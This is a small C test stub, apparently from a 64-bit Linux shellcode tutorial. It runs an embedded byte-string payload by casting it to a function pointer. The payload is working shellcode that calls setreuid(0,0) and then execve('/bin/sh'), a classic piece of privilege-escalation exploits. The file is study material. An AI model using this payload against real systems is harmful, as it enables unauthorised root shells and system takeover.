/*
 *	stub.c - a stub routine for testing shellcode.
 *	Defining SHELLCODE at compile time fixes issues with DEP.
 *
 *  Note - since this code is self-modifying, you will need to
 *  make sure that the section containing the shellcode is r/w/x
 *
 *  http://blog.markloiseau.com/2012/06/64-bit-linux-shellcode/
 *
 */

#include <stdlib.h>

char shellcode[] = "\x48\x31\xc0\x48\x83\xc0\x71\x48\x31\xff\x48\x31\xf6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3b\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\xff\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";

int main (int argc, char **argv) {
	
	// function pointer
	int (*function)();
	
	// cast shellcode as a function
	function = (int(*)())shellcode;
	
	// execute shellcode function
	(int)(*function)();
	return 0;
}
